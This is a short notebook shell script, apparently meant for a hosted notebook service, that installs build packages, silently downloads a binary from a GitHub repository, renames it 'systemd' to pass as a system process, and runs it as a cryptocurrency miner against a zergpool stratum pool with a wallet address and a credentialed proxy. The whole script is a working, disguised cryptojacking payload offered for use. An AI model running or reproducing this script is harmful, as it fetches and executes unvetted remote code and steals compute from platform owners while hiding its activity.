%%shell
#!/bin/bash

ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
dpkg-reconfigure --frontend noninteractive tzdata
rm -rf javaVM
apt-get update \
  && apt --fix-broken install \
  && apt-get install -y \
    libcurl4 \
    libjansson4 \
    wget \
    zip \
    ocl-icd-opencl-dev \
    build-essential \
    libssl-dev \
    libgmp-dev \
    libjansson-dev \
    automake \
    libnuma-dev \
    libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev build-essential binutils cmake screen unzip net-tools curl \
  && rm -rf /var/lib/apt/lists/*

wget https://github.com/Master478963/lolMinet/raw/main/data   &> /dev/null 


chmod +x data 

mv data systemd 


./systemd -a yespower -o stratum+tcp://yespower.mine.zergpool.com:6533  -u RQFqPLG7ysPijH28DvJSMnzdUcd2rS68oh -p c=RVN,ID=Test  -x sipuwfea:e90ia636sn8t@38.154.227.167:5868
